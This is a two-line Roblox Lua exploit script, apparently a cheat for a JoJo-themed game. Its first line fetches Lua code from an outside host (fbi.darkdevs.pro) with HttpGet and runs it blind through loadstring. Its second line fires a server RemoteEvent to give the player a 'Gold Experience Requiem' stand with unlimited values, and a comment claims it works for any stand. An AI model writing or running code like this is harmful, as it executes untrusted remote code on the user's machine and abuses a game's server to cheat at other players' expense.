loadstring(game:HttpGet('http://fbi.darkdevs.pro/fun/bizarre.lua-378c2a1dcd59492d92198dac14e37b8d.lua',true))()
game:GetService("ReplicatedStorage").Stand:FireServer("GoldExperienceRequiemStand", math.huge, math.huge) -- This works for any stand.
